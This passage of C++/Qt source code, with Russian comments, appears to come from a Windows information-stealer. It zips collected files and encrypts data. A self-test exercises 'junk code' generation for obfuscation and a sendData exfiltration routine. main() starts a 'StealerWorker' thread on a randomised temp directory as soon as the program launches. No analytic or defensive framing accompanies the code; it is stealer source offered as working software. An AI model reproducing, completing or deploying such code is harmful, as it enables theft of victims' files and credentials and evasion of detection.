    zip_t* zip = zip_open(zipPath.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
    if (!zip) {
        Log("Не удалось создать ZIP-архив: " + QString::fromStdString(zipPath) + " (Ошибка: " + QString::number(err) + ")");
        return "";
    }

    for (const auto& file : files) {
        zip_source_t* source = zip_source_file(zip, file.c_str(), 0, 0);
        if (!source) {
            Log("Не удалось создать источник для файла в ZIP: " + QString::fromStdString(file));
            continue;
        }

        if (zip_file_add(zip, std::filesystem::path(file).filename().string().c_str(), source, ZIP_FL_OVERWRITE) < 0) {
            zip_source_free(source);
            Log("Не удалось добавить файл в ZIP: " + QString::fromStdString(file) + " (Ошибка: " + QString::fromStdString(zip_strerror(zip)) + ")");
        }
    }

    if (zip_close(zip) < 0) {
        Log("Не удалось закрыть ZIP-архив: " + QString::fromStdString(zipPath) + " (Ошибка: " + QString::fromStdString(zip_strerror(zip)) + ")");
        return "";
    }

    Log("ZIP-архив создан: " + QString::fromStdString(zipPath));
    return zipPath;
}

// Тестирование
void MainWindow::runTests() {
    Log("Запуск тестов на целевой системе...");

    std::string testData = "Тестовые данные для шифрования " + generateRandomString(16);
    std::string encrypted = EncryptData(testData, encryptionKey1, encryptionKey2, encryptionSalt);
    std::string decrypted = DecryptData(encrypted);
    if (testData == decrypted) {
        Log("Тест шифрования/дешифрования пройден");
    } else {
        Log("Тест шифрования/дешифрования не пройден: Ожидалось '" + QString::fromStdString(testData) + "', получено '" + QString::fromStdString(decrypted) + "'");
    }

    generateJunkCode();
    if (std::filesystem::exists("junk_code_generated.h")) {
        Log("Тест генерации мусорного кода пройден");
    } else {
        Log("Тест генерации мусорного кода не пройден");
    }

    std::string tempDir = std::filesystem::temp_directory_path().string() + "\\test_" + generateRandomString(8);
    std::filesystem::create_directory(tempDir);
    std::vector<std::string> testFiles = {tempDir + "\\test.txt"};
    std::ofstream testFile(testFiles[0]);
    if (testFile.is_open()) {
        testFile << "Содержимое тестового файла";
        testFile.close();
        sendData("Тестовые данные", testFiles);
        Log("Тест отправки данных завершён (проверьте логи для подтверждения успеха)");
        std::filesystem::remove_all(tempDir);
    } else {
        Log("Не удалось создать тестовый файл для теста отправки");
    }
}

// Точка входа
int main(int argc, char *argv[]) {
    if (Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr) != Gdiplus::Ok) {
        std::cerr << "Не удалось инициализировать GDI+" << std::endl;
        return -1;
    }

    QApplication app(argc, argv);
    QCoreApplication::setAttribute(Qt::AA_EnableHighDpiScaling);

    MainWindow w;
    w.show();

    std::string tempDir = std::string(getenv("TEMP") ? getenv("TEMP") : "C:\\Temp") + "\\DeadCode_" + w.generateRandomString(8);
    StealerWorker* worker = new StealerWorker(&w, tempDir);
    QThread* thread = new QThread;
    worker->moveToThread(thread);

    QObject::connect(thread, &QThread::started, worker, &StealerWorker::process);
    QObject::connect(worker, &StealerWorker::finished, thread, &QThread::quit);
    QObject::connect(worker, &StealerWorker::finished, worker, &StealerWorker::deleteLater);
    QObject::connect(thread, &QThread::finished, thread, &QThread::deleteLater);

    thread->start();
    w.runTests();

    int result = app.exec();
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return result;
}